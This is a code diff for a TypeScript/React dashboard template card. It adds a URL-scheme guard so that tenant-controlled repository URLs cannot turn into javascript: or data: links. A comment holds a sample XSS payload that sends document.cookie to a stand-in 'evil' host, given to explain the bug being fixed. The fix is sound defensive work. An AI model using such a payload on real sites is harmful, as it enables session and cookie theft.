@@ -154,6 +154,28 @@ function getTemplatePreviewUrl(template: TemplateCatalogItem): string | null {
     return `https://opengraph.githubassets.com/${cacheKey}/${owner}/${repository}`;
 }
 
+/**
+ * Security: `template.repositoryUrl` is a DB-stored, tenant-controlled value
+ * rendered into an `<a href target="_blank">`. Without a scheme guard a custom
+ * template saved with `repositoryUrl = "javascript:fetch('//evil/?c='+document.cookie)"`
+ * lands a working XSS for everyone in the tenant — `rel="noopener noreferrer"`
+ * does NOT block `javascript:`/`data:` hrefs. Returns `undefined` for anything
+ * that isn't http/https (including non-string values, which throw in `new URL`
+ * and hit the catch). Mirrors `safeExternalUrl` in FeedRow.tsx / ItemCard.tsx.
+ */
+function safeExternalUrl(raw: string | undefined | null): string | undefined {
+    if (!raw) return undefined;
+    try {
+        const parsed = new URL(raw);
+        if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') {
+            return undefined;
+        }
+        return parsed.toString();
+    } catch {
+        return undefined;
+    }
+}
+
 function CustomizationStatusChip({
     summary,
     onClick,
@@ -229,6 +251,10 @@ function TemplateCard({
     const t = useTranslations('dashboard.templates');
     const [previewFailed, setPreviewFailed] = useState(false);
     const previewUrl = previewFailed ? null : getTemplatePreviewUrl(template);
+    // Security: only treat the repository URL as a clickable link when it is a
+    // validated http(s) URL; an unsafe scheme (javascript:/data:) falls through
+    // to the inert branch label below instead of becoming an XSS sink.
+    const safeRepositoryUrl = safeExternalUrl(template.repositoryUrl);
 
     return (
         <article
@@ -312,9 +338,9 @@ function TemplateCard({
                 </p>
 
                 <div className="flex items-center justify-between gap-2 pt-3 border-t border-border dark:border-border-dark mt-auto">
-                    {template.repositoryUrl ? (
+                    {safeRepositoryUrl ? (
                         <a
-                            href={template.repositoryUrl}
+                            href={safeRepositoryUrl}
                             target="_blank"
                             rel="noopener noreferrer"
                             className="inline-flex items-center gap-1 text-[11px] text-text-muted hover:text-text dark:text-text-muted-dark dark:hover:text-text-dark transition-colors"
